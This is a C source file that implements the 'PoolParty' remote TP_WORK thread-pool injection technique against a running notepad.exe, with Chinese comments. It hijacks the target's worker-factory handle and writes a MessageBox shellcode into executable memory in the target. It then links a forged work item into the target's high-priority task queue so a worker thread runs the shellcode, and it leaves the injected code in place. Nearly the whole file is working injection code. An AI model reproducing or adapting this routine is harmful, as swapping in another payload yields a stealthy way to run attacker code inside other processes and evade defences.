#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include "threadpool_structs.h"

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

// 简化的 MessageBox shellcode (x64)
unsigned char g_Shellcode[] =
    "\x48\x83\xEC\x28"                                     // sub rsp, 0x28
    "\x48\x31\xC9"                                          // xor rcx, rcx
    "\x48\x8D\x15\x1E\x00\x00\x00"                         // lea rdx, [rip+0x1E]
    "\x4C\x8D\x05\x27\x00\x00\x00"                         // lea r8, [rip+0x27]
    "\x48\x31\xC0"                                          // xor rax, rax
    "\x4D\x31\xC9"                                          // xor r9, r9
    "\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00"             // mov rax, MessageBoxA (to be patched)
    "\xFF\xD0"                                              // call rax
    "\x48\x83\xC4\x28"                                     // add rsp, 0x28
    "\xC3"                                                  // ret
    // "Injected!\0"
    "\x49\x6E\x6A\x65\x63\x74\x65\x64\x21\x00"
    // "PoolParty TP_WORK\0"
    "\x50\x6F\x6F\x6C\x50\x61\x72\x74\x79\x20"
    "\x54\x50\x5F\x57\x4F\x52\x4B\x00";

SIZE_T g_ShellcodeSize = sizeof(g_Shellcode);

// 根据进程名获取进程句柄
HANDLE GetProcessHandleByName(const char *procName, DWORD *PID) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[x] Cannot retrieve the processes snapshot\n");
        return NULL;
    }

    if (Process32First(snapshot, &entry)) {
        do {
            if (strcmp(entry.szExeFile, procName) == 0) {
                *PID = entry.th32ProcessID;
                printf("[+] Found target process: PID %lu\n", *PID);
                HANDLE hProc = OpenProcess(
                    PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
                    PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
                    FALSE, *PID);
                CloseHandle(snapshot);
                if (!hProc) {
                    printf("[x] Cannot open process: %lu\n", GetLastError());
                    return NULL;
                }
                return hProc;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return NULL;
}

// 劫持目标进程的 Worker Factory 句柄
HANDLE HijackWorkerFactoryHandle(HANDLE hProcess) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[x] Failed to get ntdll.dll handle\n");
        return NULL;
    }

    typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
        HANDLE ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );

    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");

    if (!NtQueryInformationProcess) {
        printf("[x] Failed to get NtQueryInformationProcess\n");
        return NULL;
    }

    // 查询目标进程的句柄信息
    ULONG returnLength = 0;
    NTSTATUS status;

    // 首先查询需要的缓冲区大小
    status = NtQueryInformationProcess(hProcess, (PROCESSINFOCLASS)51, NULL, 0, &returnLength);

    PPROCESS_HANDLE_SNAPSHOT_INFORMATION pHandleInfo =
        (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)malloc(returnLength);

    if (!pHandleInfo) {
        printf("[x] Failed to allocate memory for handle information\n");
        return NULL;
    }

    status = NtQueryInformationProcess(hProcess, (PROCESSINFOCLASS)51,
                                       pHandleInfo, returnLength, &returnLength);

    if (!NT_SUCCESS(status)) {
        printf("[x] NtQueryInformationProcess failed: 0x%lX\n", status);
        free(pHandleInfo);
        return NULL;
    }

    printf("[+] Retrieved %llu handles from target process\n", pHandleInfo->NumberOfHandles);

    // 遍历所有句柄，找到 TpWorkerFactory 类型
    typedef NTSTATUS (NTAPI *pNtQueryObject)(
        HANDLE Handle,
        OBJECT_INFORMATION_CLASS ObjectInformationClass,
        PVOID ObjectInformation,
        ULONG ObjectInformationLength,
        PULONG ReturnLength
    );

    pNtQueryObject NtQueryObject =
        (pNtQueryObject)GetProcAddress(hNtdll, "NtQueryObject");

    for (ULONG64 i = 0; i < pHandleInfo->NumberOfHandles; i++) {
        HANDLE hDuplicated = NULL;

        if (!DuplicateHandle(hProcess,
                            pHandleInfo->Handles[i].HandleValue,
                            GetCurrentProcess(),
                            &hDuplicated,
                            WORKER_FACTORY_ALL_ACCESS,
                            FALSE,
                            0)) {
            continue;
        }

        // 查询对象类型
        BYTE buffer[512];
        PPUBLIC_OBJECT_TYPE_INFORMATION pTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)buffer;

        status = NtQueryObject(hDuplicated, ObjectTypeInformation,
                              pTypeInfo, sizeof(buffer), NULL);

        if (NT_SUCCESS(status)) {
            if (pTypeInfo->TypeName.Length > 0 &&
                wcsncmp(pTypeInfo->TypeName.Buffer, L"TpWorkerFactory", 15) == 0) {
                printf("[+] Hijacked Worker Factory handle: %p\n", hDuplicated);
                free(pHandleInfo);
                return hDuplicated;
            }
        }

        CloseHandle(hDuplicated);
    }

    free(pHandleInfo);
    printf("[x] Failed to find Worker Factory handle\n");
    return NULL;
}

// 查询 Worker Factory 信息
BOOL QueryWorkerFactoryInformation(HANDLE hWorkerFactory,
                                   PWORKER_FACTORY_BASIC_INFORMATION pInfo) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationWorkerFactory NtQueryInformationWorkerFactory =
        (pNtQueryInformationWorkerFactory)GetProcAddress(hNtdll, "NtQueryInformationWorkerFactory");

    if (!NtQueryInformationWorkerFactory) {
        printf("[x] Failed to get NtQueryInformationWorkerFactory\n");
        return FALSE;
    }

    NTSTATUS status = NtQueryInformationWorkerFactory(
        hWorkerFactory,
        WorkerFactoryBasicInformation,
        pInfo,
        sizeof(WORKER_FACTORY_BASIC_INFORMATION),
        NULL
    );

    if (!NT_SUCCESS(status)) {
        printf("[x] NtQueryInformationWorkerFactory failed: 0x%lX\n", status);
        return FALSE;
    }

    printf("[+] Worker Factory StartParameter (TP_POOL): %p\n", pInfo->StartParameter);
    printf("[+] Total worker count: %lu\n", pInfo->TotalWorkerCount);

    return TRUE;
}

int main(void) {
    printf("[*] PoolParty - TP_WORK Injection Technique\n");
    printf("[*] Variant: RemoteTpWorkInsertion\n\n");

    // Patch MessageBoxA address into shellcode
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    FARPROC pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");
    if (!pMessageBoxA) {
        printf("[x] Failed to get MessageBoxA address\n");
        return -1;
    }
    *(DWORD64*)(g_Shellcode + 26) = (DWORD64)pMessageBoxA;

    // 获取目标进程句柄
    DWORD targetPid = 0;
    HANDLE hTargetProcess = GetProcessHandleByName("notepad.exe", &targetPid);
    if (!hTargetProcess) {
        printf("[x] Failed to open target process\n");
        printf("[!] Please start notepad.exe first\n");
        return -1;
    }

    printf("\n[+] Starting PoolParty attack against PID: %lu\n", targetPid);

    // 劫持 Worker Factory 句柄
    HANDLE hWorkerFactory = HijackWorkerFactoryHandle(hTargetProcess);
    if (!hWorkerFactory) {
        CloseHandle(hTargetProcess);
        return -1;
    }

    // 查询 Worker Factory 信息
    WORKER_FACTORY_BASIC_INFORMATION wfInfo = {0};
    if (!QueryWorkerFactoryInformation(hWorkerFactory, &wfInfo)) {
        CloseHandle(hWorkerFactory);
        CloseHandle(hTargetProcess);
        return -1;
    }

    // 分配 shellcode 内存
    LPVOID pShellcodeAddress = VirtualAllocEx(hTargetProcess, NULL, g_ShellcodeSize,
                                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pShellcodeAddress) {
        printf("[x] Failed to allocate shellcode memory: %lu\n", GetLastError());
        CloseHandle(hWorkerFactory);
        CloseHandle(hTargetProcess);
        return -1;
    }
    printf("[+] Allocated shellcode memory at: %p\n", pShellcodeAddress);

    // 写入 shellcode
    if (!WriteProcessMemory(hTargetProcess, pShellcodeAddress, g_Shellcode, g_ShellcodeSize, NULL)) {
        printf("[x] Failed to write shellcode: %lu\n", GetLastError());
        VirtualFreeEx(hTargetProcess, pShellcodeAddress, 0, MEM_RELEASE);
        CloseHandle(hWorkerFactory);
        CloseHandle(hTargetProcess);
        return -1;
    }
    printf("[+] Written shellcode to target process\n");

    // 读取目标进程的 TP_POOL 结构
    FULL_TP_POOL targetTpPool = {0};
    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(hTargetProcess, wfInfo.StartParameter,
                          &targetTpPool, sizeof(FULL_TP_POOL), &bytesRead)) {
        printf("[x] Failed to read TP_POOL structure: %lu\n", GetLastError());
        VirtualFreeEx(hTargetProcess, pShellcodeAddress, 0, MEM_RELEASE);
        CloseHandle(hWorkerFactory);
        CloseHandle(hTargetProcess);
        return -1;
    }
    printf("[+] Read target process's TP_POOL structure\n");

    // 读取高优先级任务队列
    TPP_QUEUE targetTaskQueue = {0};
    if (!ReadProcessMemory(hTargetProcess, targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH],
                          &targetTaskQueue, sizeof(TPP_QUEUE), &bytesRead)) {
        printf("[x] Failed to read task queue: %lu\n", GetLastError());
        VirtualFreeEx(hTargetProcess, pShellcodeAddress, 0, MEM_RELEASE);
        CloseHandle(hWorkerFactory);
        CloseHandle(hTargetProcess);
        return -1;
    }

    // 在本地创建 TP_WORK 结构
    PTP_WORK pTpWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)pShellcodeAddress, NULL, NULL);
    if (!pTpWork) {
        printf("[x] Failed to create TP_WORK: %lu\n", GetLastError());
        VirtualFreeEx(hTargetProcess, pShellcodeAddress, 0, MEM_RELEASE);
        CloseHandle(hWorkerFactory);
        CloseHandle(hTargetProcess);
        return -1;
    }
    printf("[+] Created local TP_WORK structure\n");

    // 修改 TP_WORK 结构
    PFULL_TP_WORK pFullTpWork = (PFULL_TP_WORK)pTpWork;
    pFullTpWork->CleanupGroupMember.Pool = (PFULL_TP_POOL)wfInfo.StartParameter;
    pFullTpWork->Task.ListEntry.Flink = &targetTaskQueue.Queue;
    pFullTpWork->Task.ListEntry.Blink = &targetTaskQueue.Queue;
    pFullTpWork->WorkState.Exchange = 0x2;  // Insertable
    printf("[+] Modified TP_WORK to point to target process's TP_POOL\n");

    // 在目标进程中分配 TP_WORK 内存
    LPVOID pRemoteTpWork = VirtualAllocEx(hTargetProcess, NULL, sizeof(FULL_TP_WORK),
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteTpWork) {
        printf("[x] Failed to allocate TP_WORK memory: %lu\n", GetLastError());
        CloseThreadpoolWork(pTpWork);
        VirtualFreeEx(hTargetProcess, pShellcodeAddress, 0, MEM_RELEASE);
        CloseHandle(hWorkerFactory);
        CloseHandle(hTargetProcess);
        return -1;
    }
    printf("[+] Allocated TP_WORK memory in target process: %p\n", pRemoteTpWork);

    // 写入 TP_WORK 结构
    if (!WriteProcessMemory(hTargetProcess, pRemoteTpWork, pFullTpWork,
                           sizeof(FULL_TP_WORK), NULL)) {
        printf("[x] Failed to write TP_WORK structure: %lu\n", GetLastError());
        CloseThreadpoolWork(pTpWork);
        VirtualFreeEx(hTargetProcess, pRemoteTpWork, 0, MEM_RELEASE);
        VirtualFreeEx(hTargetProcess, pShellcodeAddress, 0, MEM_RELEASE);
        CloseHandle(hWorkerFactory);
        CloseHandle(hTargetProcess);
        return -1;
    }
    printf("[+] Written TP_WORK structure to target process\n");

    // 修改目标进程的任务队列链表
    PLIST_ENTRY pRemoteTaskList = &((PFULL_TP_WORK)pRemoteTpWork)->Task.ListEntry;

    if (!WriteProcessMemory(hTargetProcess,
                           &targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink,
                           &pRemoteTaskList, sizeof(pRemoteTaskList), NULL)) {
        printf("[x] Failed to modify task queue Flink: %lu\n", GetLastError());
        CloseThreadpoolWork(pTpWork);
        VirtualFreeEx(hTargetProcess, pRemoteTpWork, 0, MEM_RELEASE);
        VirtualFreeEx(hTargetProcess, pShellcodeAddress, 0, MEM_RELEASE);
        CloseHandle(hWorkerFactory);
        CloseHandle(hTargetProcess);
        return -1;
    }

    if (!WriteProcessMemory(hTargetProcess,
                           &targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink,
                           &pRemoteTaskList, sizeof(pRemoteTaskList), NULL)) {
        printf("[x] Failed to modify task queue Blink: %lu\n", GetLastError());
        CloseThreadpoolWork(pTpWork);
        VirtualFreeEx(hTargetProcess, pRemoteTpWork, 0, MEM_RELEASE);
        VirtualFreeEx(hTargetProcess, pShellcodeAddress, 0, MEM_RELEASE);
        CloseHandle(hWorkerFactory);
        CloseHandle(hTargetProcess);
        return -1;
    }
    printf("[+] Modified target process's task queue to point to our TP_WORK\n");

    printf("\n[+] PoolParty attack completed successfully!\n");
    printf("[!] The shellcode will execute when a worker thread picks up the task\n");
    printf("[!] Try interacting with notepad.exe to trigger execution\n");

    // 清理本地资源（不清理目标进程的内存，让注入的代码继续存在）
    CloseThreadpoolWork(pTpWork);
    CloseHandle(hWorkerFactory);
    CloseHandle(hTargetProcess);

    return 0;
}
